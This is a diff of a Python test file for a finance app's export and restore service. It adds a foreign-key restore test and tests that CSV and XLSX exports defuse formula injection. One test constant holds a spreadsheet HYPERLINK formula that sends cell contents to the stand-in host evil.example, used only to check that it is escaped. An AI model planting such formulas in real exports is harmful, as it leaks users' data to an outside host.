@@ -10,20 +10,26 @@
 старую.
 """
 
+import io
 import uuid
 from datetime import UTC, date, datetime
 from decimal import Decimal
 from typing import Any, cast
 
 import pytest
-from sqlalchemy import select
-from sqlalchemy.ext.asyncio import AsyncSession
+from openpyxl import load_workbook
+from sqlalchemy import event, select
+from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
 
-from app.core.enums import CategoryKind, GoalKind, TransactionKind
+from app.core.enums import AccountType, CategoryKind, GoalKind, TransactionKind
 from app.core.exceptions import AlreadyExistsError
+from app.core.models import Base
+from app.domains.accounts.models import Account
 from app.domains.auth.models import User
+from app.domains.budgets.models import Budget
 from app.domains.categories.models import Category
 from app.domains.credits.models import Credit, CreditPayment
+from app.domains.currencies.models import Currency
 from app.domains.export.repository import SqlExportRepository
 from app.domains.export.service import BACKUP_VERSION, ExportService
 from app.domains.goals.models import CategoryGoal
@@ -31,7 +37,7 @@ from app.domains.import_.repository import SqlImportRepository
 from app.domains.import_.service import ImportService
 from app.domains.payees.models import Payee
 from app.domains.reconciliation.models import Reconciliation
-from app.domains.transactions.models import Transaction
+from app.domains.transactions.models import Transaction, Transfer
 
 WHEN = datetime(2026, 9, 10, 12, 0, tzinfo=UTC)
 
@@ -249,6 +255,79 @@ async def test_restore_rebuilds_every_link_for_the_new_owner(
     assert reconciliation.adjustment_transaction_id in own_tx
 
 
+async def test_restore_respects_foreign_keys() -> None:
+    """Восстановление на базе, которая проверяет внешние ключи.
+
+    Общая фикстура — SQLite без проверки ключей, и на ней бюджет,
+    вставленный раньше своей категории, проходил. На PostgreSQL то же
+    восстановление падало. Здесь ключи включены, как на проде.
+    """
+    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
+
+    @event.listens_for(engine.sync_engine, "connect")
+    def _foreign_keys(dbapi_conn: Any, _: Any) -> None:
+        dbapi_conn.execute("PRAGMA foreign_keys=ON")
+
+    async with engine.begin() as conn:
+        await conn.run_sync(Base.metadata.create_all)
+    try:
+        async with AsyncSession(engine, expire_on_commit=False) as session:
+            session.add(Currency(code="RUB", name="Рубль", decimals=2))
+            user = User(email="fk-owner@example.com", hashed_password="x")
+            session.add(user)
+            await session.flush()
+            rub = Account(
+                user_id=user.id,
+                name="Альфа",
+                type=AccountType.CARD,
+                currency_code="RUB",
+            )
+            session.add(rub)
+            await session.flush()
+            ledger = {"user": user.id, "rub": rub.id}
+            await _fill(session, ledger)
+            food = await session.scalar(
+                select(Category).where(
+                    Category.user_id == user.id, Category.name == "Продукты"
+                )
+            )
+            assert food is not None
+            # Бюджет и перевод — то, что раньше вставлялось не в том
+            # порядке: Budget раньше Category, Transaction раньше Transfer.
+            session.add(
+                Budget(
+                    user_id=user.id,
+                    month=date(2026, 9, 1),
+                    category_id=food.id,
+                    planned=Decimal("15000"),
+                )
+            )
+            transfer = Transfer(user_id=user.id)
+            session.add(transfer)
+            await session.flush()
+            session.add(
+                _tx(
+                    ledger,
+                    TransactionKind.TRANSFER,
+                    "-1000",
+                    transfer_id=transfer.id,
+                )
+            )
+            await session.flush()
+
+            bundle = await ExportService(
+                SqlExportRepository(session)
+            ).build_backup(user.id)
+            owner = await _second_user(session)
+
+            result = await _service(session).restore_all(owner, bundle)
+
+            assert result.budgets == 1
+            assert result.transfers == 1
+    finally:
+        await engine.dispose()
+
+
 async def test_restore_refuses_an_account_that_already_has_goals(
     db_session: AsyncSession, ledger: dict[str, uuid.UUID]
 ) -> None:
@@ -276,6 +355,56 @@ async def test_restore_refuses_an_account_that_already_has_goals(
 
     with pytest.raises(AlreadyExistsError):
         await _service(db_session).restore_all(owner, bundle)
+
+
+TRAP = '=HYPERLINK("https://evil.example/?d="&A2,"чек")'
+
+
+async def _trap(
+    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
+) -> None:
+    db_session.add(
+        _tx(
+            ledger,
+            TransactionKind.EXPENSE,
+            "-100",
+            comment=TRAP,
+            payee_name_snapshot="+79991234567",
+        )
+    )
+    await db_session.flush()
+
+
+async def test_csv_does_not_turn_text_into_formulas(
+    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
+) -> None:
+    await _trap(db_session, ledger)
+
+    csv_text = await ExportService(
+        SqlExportRepository(db_session)
+    ).transactions_csv(ledger["user"], None, None)
+
+    assert "'" + TRAP.replace('"', '""') in csv_text
+    assert "'+79991234567" in csv_text
+    # Суммы — числа, их не трогаем.
+    assert "'-100" not in csv_text
+
+
+async def test_xlsx_keeps_formula_like_text_as_text(
+    db_session: AsyncSession, ledger: dict[str, uuid.UUID]
+) -> None:
+    await _trap(db_session, ledger)
+
+    raw = await ExportService(
+        SqlExportRepository(db_session)
+    ).transactions_xlsx(ledger["user"], None, None)
+
+    sheet = load_workbook(io.BytesIO(raw)).active
+    assert sheet is not None
+    cells = [c for row in sheet.iter_rows(min_row=2) for c in row]
+    trap = next(c for c in cells if c.value == TRAP)
+    assert trap.data_type == "s"
+    assert not any(c.data_type == "f" for c in cells)
 
 
 async def test_csv_names_the_payee_and_the_full_category_path(
